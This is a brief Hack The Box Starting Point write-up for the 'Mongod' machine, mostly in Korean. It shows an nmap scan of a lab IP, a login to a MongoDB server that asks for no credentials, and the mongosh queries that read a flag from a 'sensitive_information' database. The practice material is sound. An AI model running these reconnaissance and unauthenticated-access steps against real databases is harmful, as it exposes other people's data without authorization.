# Mongod - HacktheBox StartingPoint
## Recon
```bash
sudo nmap -p 22,27017 -sC -sV -vv -oA mongod 10.129.5.3
```
- SSH(22)
- MongoDB(27017)
<img width="1106" height="467" alt="image" src="https://github.com/user-attachments/assets/b2dd5b0f-6665-4e4d-8da0-89a2d7b41818" />

## MongoDB
- mongosh Download Guide : https://www.bytebase.com/reference/mongodb/how-to/how-to-install-mongodb-shell-on-mac-ubuntu-centos-windows/
- mongosh로 접속할 계정은 알지 못하나, 로그인을 시도해봄.
```bash
mongosh --host 10.129.5.3
```
<img width="1106" height="441" alt="image" src="https://github.com/user-attachments/assets/a1598623-5200-43b3-95ec-1af1c4d819e3" />

- query문을 이용하여 `sensitive_information` db의 `flag` collection을 통해서 flag를 찾을 수 있다.
```
test> show dbs;

test> use sensitive_information;

sensitive_information> show collections;

sensitive_information> db.flag.find()
```
<img width="1106" height="219" alt="image" src="https://github.com/user-attachments/assets/b5bf8bf9-83c4-4f3a-8a19-a6596c4ad683" />
